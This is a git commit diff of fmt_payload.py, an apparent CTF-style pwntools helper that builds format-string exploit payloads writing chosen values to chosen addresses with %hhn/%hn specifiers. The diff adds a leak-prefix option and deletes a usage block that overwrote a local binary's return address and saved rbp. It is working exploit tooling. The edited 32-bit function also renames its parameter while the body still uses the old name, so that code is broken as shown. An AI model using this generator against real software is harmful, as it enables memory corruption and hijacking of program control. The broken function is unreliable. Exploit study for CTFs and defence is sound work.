a7bb230b46059d61b203e3a0203a703a1e8aaf8d
BinSong <83495929+H4ckF0rFun@users.noreply.github.com>
2022-10-16 15:20:13 +0800

    Update fmt_payload.py

--- fmt_payload.py
+++ fmt_payload.py
@@ -1,7 +1,7 @@
 
 from pwn import*
 
-def fmt_payload32(dword_of_esp_fmt,list_data,wide='$hhn'):
+def fmt_payload32(list_data,dword_of_rsp_fmt = 0,wide='$hhn',prefix= b'',prefix_outlen= 0):
     
     _len = len(list_data)
     arg_start = dword_of_esp_fmt
@@ -38,7 +38,6 @@ def fmt_payload32(dword_of_esp_fmt,list_data,wide='$hhn'):
             parts.append((part_addr,part_val))
 
     #sort by val 
-
     for i in range(len(parts)):
         for j in range(i+1,len(parts)):
             if(parts[j][1]<parts[i][1]):
@@ -51,14 +50,18 @@ def fmt_payload32(dword_of_esp_fmt,list_data,wide='$hhn'):
     fmt_string_len = 0
     generate_success = False
 
+    if parts[0][1] < prefix_outlen:
+        print('Error: prefix_outlen is longger than low bytes count.')
+        return None
+
     while False == generate_success:
         inc_len = False
-        payload = b''
+        payload = prefix
 
         for i in range(len(parts)):
             if i==0:
                 if parts[0][1] != 0:
-                    payload += b'%%%dc'%(parts[0][1])
+                    payload += b'%%%dc'%(parts[0][1] - prefix_outlen)
             else:
                 if (parts[i][1]-parts[i-1][1]) != 0:
                     payload += b'%%%dc'%(parts[i][1] - parts[i-1][1])
@@ -81,87 +84,6 @@ def fmt_payload32(dword_of_esp_fmt,list_data,wide='$hhn'):
 
     return payload
 
-def fmt_payload64(qword_of_rsp_fmt,list_data,wide='$hhn'):
-    
-    _len = len(list_data)
-    arg_start = 5 + qword_of_rsp_fmt + 1
-    
-    bits = 8
-
-    if wide == '$hhn':
-        bits = 8
-    if wide == '$hn':
-        bits = 16
-    if wide == '$n':
-        bits = 32
-    if wide == '$ln':
-        bits = 64
-    
-    mask = 0x0
-    for i in range(bits):
-        mask = (mask<<1)|1
-    
-    parts = []      #(addr,val)
-    #save to list
-    for i in range(_len):
-        size = list_data[i][2]
-        value = list_data[i][1]
-        addr = list_data[i][0]
-        
-        c = size//(bits//8)
-        if c == 0:
-        	c = 1
-        
-        for j in range(c):
-            part_addr = addr + j * (bits//8)
-            part_val = (value>>(j * bits)) & mask
-            parts.append((part_addr,part_val))
-
-    #sort by val 
-
-    for i in range(len(parts)):
-        for j in range(i+1,len(parts)):
-            if(parts[j][1]<parts[i][1]):
-                tmp = parts[i]
-                parts[i] = parts[j]
-                parts[j] = tmp
-
-    #generate fmt payload
-    payload = b''
-    fmt_string_len = 0
-    generate_success = False
-
-    while False == generate_success:
-        inc_len = False
-        payload = b''
-
-        for i in range(len(parts)):
-            if i==0:
-                if parts[0][1] != 0:
-                    payload += b'%%%dc'%(parts[0][1])
-            else:
-                if (parts[i][1]-parts[i-1][1]) != 0:
-                    payload += b'%%%dc'%(parts[i][1] - parts[i-1][1])
-
-            tmp = payload + b'%' + str(i + arg_start + fmt_string_len//8).encode() + wide.encode()
-            
-            if len(tmp) >= fmt_string_len:
-                fmt_string_len += 8
-                inc_len = True   
-                break
-            else:
-                payload += b'%' + str(i + arg_start + fmt_string_len//8).encode() + wide.encode()
-        if inc_len == False:
-            generate_success = True
-    payload = payload.ljust(fmt_string_len,b'\x00')
-    print(parts)
-
-    for i in range(len(parts)):
-         payload += p64(parts[i][0])
-
-    return payload
-
-
 '''
     list_data : [
         (addr,val,Number Of Write Bytes)
@@ -178,9 +100,10 @@ def fmt_payload64(qword_of_rsp_fmt,list_data,wide='$hhn'):
     Example:
         payload = fmt_payload64_with_prefix(prefix=b'%512$p',prefix_outlen = len('0x7ffff7fd15e0'),
             qword_of_rsp_fmt = 0,list_data = write_,wide='$hhn')
-        leak and write value to target address.
+
+        leak data and write value to target address.
 '''
-def fmt_payload64_with_prefix(list_data,qword_of_rsp_fmt = 0,wide='$hhn',prefix= b'',prefix_outlen= 0):
+def fmt_payload64(list_data,qword_of_rsp_fmt = 0,wide='$hhn',prefix= b'',prefix_outlen= 0):
     _len = len(list_data)
     arg_start = 5 + qword_of_rsp_fmt + 1
     bits = 8
@@ -262,22 +185,3 @@ def fmt_payload64_with_prefix(list_data,qword_of_rsp_fmt = 0,wide='$hhn',prefix=
 
     return payload
 
-'''
-Usage:
-'''
-
-if __name__ == 'main':
-    sh = process('./a.out')
-    sh.recvuntil(b'gift:')
-
-    stack = int(sh.recvline()[:-1],16)
-    ret_addr = stack + 0x1010 + 0x8
-    rbp = stack + 0x1010
-
-    payload = fmt_payload(0,[(ret_addr,0x7fff12345678,8),(rbp,0x123412341234,8)],wide='$hn')
-    print(payload)
-
-    gdb.attach(sh)
-    sleep(1)
-    sh.send(payload)
-    sh.interactive()
